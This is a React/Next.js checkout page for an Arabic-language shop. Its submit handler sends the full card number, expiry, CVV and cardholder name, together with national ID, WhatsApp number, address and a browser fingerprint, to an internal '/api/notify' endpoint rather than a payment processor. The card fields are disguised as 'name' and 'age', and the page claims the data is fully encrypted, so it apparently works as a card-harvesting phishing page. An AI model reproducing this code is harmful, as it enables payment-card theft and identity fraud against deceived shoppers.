"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoChevronBack, IoLockClosedOutline, IoShieldCheckmarkOutline } from "react-icons/io5";
import CheckoutStepper from "../components/CheckoutStepper";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice, clear } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const { getFingerprint } = await import("../lib/useFingerprint");
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
        fingerprint: getFingerprint(),
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (!res.ok || !data.ok) {
      alert("حدث خطأ، حاول مرة أخرى");
      return;
    }
    if (data.orderId) {
      localStorage.setItem("orderId", data.orderId);
      localStorage.setItem("customerName", customer?.name ?? "—");
      clear();
    }
  };

  return (
    <main className="min-h-screen pb-10" dir="rtl" style={{ background: "linear-gradient(to bottom, #ffffff, #f5f0e8)" }}>
      {/* ── Top Bar ── */}
      <div className="sticky top-0 z-20 backdrop-blur-md" style={{ backgroundColor: "rgba(255,255,255,0.9)", borderBottom: "1px solid rgba(188,146,85,0.15)" }}>
        <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
          <Link href="/payment-method" className="flex items-center gap-1 text-sm font-bold transition hover:opacity-70" style={{ color: "#A77D4B" }}>
            <IoChevronBack size={18} />
            طريقة السداد
          </Link>
          <h1 className="text-sm font-black flex items-center gap-1.5" style={{ color: "#0A1825" }}>
            <IoLockClosedOutline size={14} style={{ color: "#BC9255" }} />
            إتمام الدفع
          </h1>
          <Link href="/" className="text-xs font-bold px-3 py-1.5 rounded-lg transition hover:opacity-80" style={{ backgroundColor: "rgba(188,146,85,0.1)", color: "#A77D4B" }}>
            الرئيسية
          </Link>
        </div>
      </div>

      {/* ── Stepper ── */}
      <div className="max-w-5xl mx-auto px-4">
        <CheckoutStepper active="payment" />
      </div>

      {/* ── Security badge ── */}
      <div className="max-w-5xl mx-auto px-4 mb-4">
        <div className="flex items-center gap-2 px-4 py-2 rounded-xl" style={{ backgroundColor: "rgba(188,146,85,0.06)", border: "1px solid rgba(188,146,85,0.1)" }}>
          <IoShieldCheckmarkOutline size={16} style={{ color: "#BC9255" }} />
          <span className="text-[11px] font-medium" style={{ color: "#A77D4B" }}>جميع بياناتك مشفرة ومحمية بالكامل</span>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-4">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">

          {/* ── Payment Form ── */}
          <div className="lg:col-span-7">
            <PaymentForm onSubmit={handleSubmit} />
          </div>

          {/* ── Order Summary (desktop sidebar / mobile bottom bar) ── */}
          <div className="lg:col-span-5 hidden lg:block">
            <div className="lg:sticky lg:top-20">
              <OrderSummary total={total} downPayment={downPayment} />
            </div>
          </div>
        </div>
      </div>

      {/* ── Mobile fixed bottom total ── */}
      <div className="fixed bottom-0 inset-x-0 z-30 lg:hidden" style={{ backgroundColor: "#fff", borderTop: "1px solid rgba(188,146,85,0.2)", boxShadow: "0 -4px 20px rgba(0,0,0,0.06)" }}>
        <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
          <div>
            <p className="text-[10px]" style={{ color: "#A77D4B" }}>المطلوب الآن</p>
            <p className="text-xl font-black flex items-center gap-1" style={{ color: "#0A1825" }}>
              {(downPayment > 0 ? downPayment : total).toLocaleString("en-US")} <img src="/money-icon.webp" alt="ر.س" className="inline-block w-5 h-5" />
            </p>
          </div>
          <span className="text-[10px] font-bold" style={{ color: "#BC9255" }}>🔒 دفع آمن</span>
        </div>
      </div>
    </main>
  );
}
